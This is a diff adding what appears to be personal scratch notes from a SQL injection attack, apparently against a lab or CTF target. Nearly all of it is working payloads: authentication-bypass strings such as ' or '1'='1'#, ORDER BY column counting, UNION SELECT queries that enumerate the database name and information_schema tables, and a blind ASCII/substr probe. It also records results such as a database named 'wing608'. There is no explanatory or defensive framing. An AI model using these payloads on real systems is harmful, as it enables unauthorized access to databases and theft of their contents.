@@ -1,0 +1,39 @@
+' or '1'='1'#
+" or '1'='1'#
+
+
+
+order by 6
+
+
+
+union select 1,database(),3,4,5,6 limit 1,1 # 
+
+databasse => wing608
+
+CHARACTER_SETS
+
+COLLATIONS
+
+
+
+
+
+
+4 => COLUMNS
+
+union select 1,2,table_name,4,5,6 from information_schema.tables limit 1,1#
+
+union select 1,2,table_name,4,5,6 from information_schema.tables limit 9,9#
+
+' or ascii(substr((select tables_name from information_schema.tables limit 2,2 ),1,1))= 1#
+
+
+
+
+' order by 3
+
+' or '1'='1
+" or "1"="1
+
+
